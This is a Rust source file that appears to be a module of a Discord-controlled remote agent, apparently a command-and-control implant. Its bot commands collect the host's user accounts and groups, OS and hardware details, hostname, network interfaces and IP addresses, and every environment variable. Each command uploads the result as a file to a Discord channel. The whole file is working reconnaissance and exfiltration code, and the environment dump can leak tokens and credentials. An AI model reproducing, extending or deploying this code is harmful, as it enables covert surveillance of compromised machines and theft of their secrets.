use std::sync::LazyLock;

use commands::command_channel_check;
use sysinfo::Users;
use tabled::{settings::Style, Table, Tabled};

use crate::*;

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Displays the agent's configuration
pub async fn config(ctx: RuscordContext<'_>) -> RuscordResult<()> {
    let config = ctx.data().config.read().await;
    unchecked_reply!(ctx, "```{}```", config.to_string())?;
    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Displays all active users, their groups, and UID
pub async fn users(ctx: RuscordContext<'_>) -> RuscordResult<()> {
    #[derive(Tabled)]
    struct UserInfo {
        #[tabled(rename = "Name")]
        name: String,
        #[tabled(rename = "Groups")]
        groups: String,
        #[tabled(rename = "UID")]
        uid: String,
    }

    let users = Users::new_with_refreshed_list();
    let users_with_groups: Vec<_> = users.into_iter().map(|u| (u, u.groups())).collect();

    let users_str = users_with_groups.into_iter().map(|(u, groups)| UserInfo {
        name: u.name().to_string(),
        groups: if groups.is_empty() {
            "None".to_string()
        } else {
            groups
                .iter()
                .map(|g| g.name().to_string())
                .collect::<Vec<_>>()
                .join(", ")
        },
        uid: u.id().to_string(),
    });
    let table = Table::new(users_str).with(Style::modern()).to_string();
    reply_as_attachment!(ctx, "users.txt", table);
    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Displays system information (OS, kernel, hostname, etc.)
pub async fn sysinfo(ctx: RuscordContext<'_>) -> RuscordResult<()> {
    static OS_VERSION_INFO: LazyLock<&'static str, fn() -> &'static str> = LazyLock::new(|| {
        let mut os_info = String::new();
        if let Some(os_ver) = sysinfo::System::long_os_version() {
            os_info.push_str(&os_ver);
        }
        if let Some(kernel_ver) = sysinfo::System::kernel_version() {
            if !os_info.is_empty() {
                os_info.push(' ');
            }
            os_info.push_str(&kernel_ver);
        }
        Box::leak(os_info.into_boxed_str())
    });
    static HOSTNAME: LazyLock<&'static str, fn() -> &'static str> = LazyLock::new(|| {
        Box::leak(
            sysinfo::System::host_name()
                .unwrap_or_default()
                .into_boxed_str(),
        )
    });

    let mut sys = sysinfo::System::new();
    sys.refresh_cpu_all();

    // CPU information
    let cpu_info = format!(
        "{} cores @ {:.2} GHz\nVendor: {}\nBrand: {}",
        sys.cpus().len(),
        sys.cpus()[0].frequency() as f64 / 1000.0,
        sys.cpus()[0].vendor_id(),
        sys.cpus()[0].brand(),
    );

    let uptime = sysinfo::System::uptime();
    let days = uptime / 86400;
    let hours = (uptime % 86400) / 3600;
    let minutes = (uptime % 3600) / 60;
    let seconds = uptime % 60;
    let uptime_str = format!("{}d {}h {}m {}s", days, hours, minutes, seconds);

    #[derive(Tabled)]
    struct SystemInfo<'a> {
        #[tabled(rename = "Property")]
        property: &'a str,
        #[tabled(rename = "Value")]
        value: &'a str,
    }
    let info = vec![
        SystemInfo {
            property: "OS Info",
            value: *OS_VERSION_INFO,
        },
        SystemInfo {
            property: "CPU Info",
            value: cpu_info.as_str(),
        },
        SystemInfo {
            property: "Hostname",
            value: *HOSTNAME,
        },
        SystemInfo {
            property: "Uptime",
            value: uptime_str.as_str(),
        },
    ];

    let table = Table::new(info).with(Style::modern()).to_string();
    reply_as_attachment!(ctx, "sysinfo.txt", table);
    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Shows network interfaces and their status
pub async fn ifconfig(ctx: RuscordContext<'_>) -> RuscordResult<()> {
    use sysinfo::Networks;

    #[derive(Tabled)]
    struct NetworkInfo {
        #[tabled(rename = "Interface")]
        interface: String,
        #[tabled(rename = "IP Networks")]
        ip_networks: String,
        #[tabled(rename = "Received (MB)")]
        received: String,
        #[tabled(rename = "Transmitted (MB)")]
        transmitted: String,
    }
    let networks = Networks::new_with_refreshed_list();
    let mut interfaces: Vec<_> = networks
        .iter()
        .map(|(name, data)| {
            let ip_networks = if !data.ip_networks().is_empty() {
                // Only allocate string if we have IP networks
                data.ip_networks()
                    .iter()
                    .map(|ip| format!("{}/{}", ip.addr, ip.prefix))
                    .collect::<Vec<_>>()
                    .join(", ")
            } else {
                String::new()
            };

            NetworkInfo {
                interface: name.to_string(),
                ip_networks,
                received: format!("{:.1}", data.total_received() as f64 / 1024.0 / 1024.0),
                transmitted: format!("{:.1}", data.total_transmitted() as f64 / 1024.0 / 1024.0),
            }
        })
        .collect();

    interfaces.sort_by_key(|info| (info.ip_networks.is_empty(), info.interface.clone()));

    let table = Table::new(interfaces).with(Style::modern()).to_string();
    reply_as_attachment!(ctx, "network.txt", table);
    Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Displays system environment variables
pub async fn env(ctx: RuscordContext<'_>) -> RuscordResult<()> {
    #[derive(Tabled)]
    struct EnvInfo {
        #[tabled(rename = "Variable")]
        key: String,
        #[tabled(rename = "Value")]
        value: String,
    }

    let env_vars: Vec<_> = std::env::vars()
        .map(|(key, value)| EnvInfo { key, value })
        .collect();

    let table = Table::new(env_vars).with(Style::modern()).to_string();
    reply_as_attachment!(ctx, "environment.txt", table);
    Ok(())
}
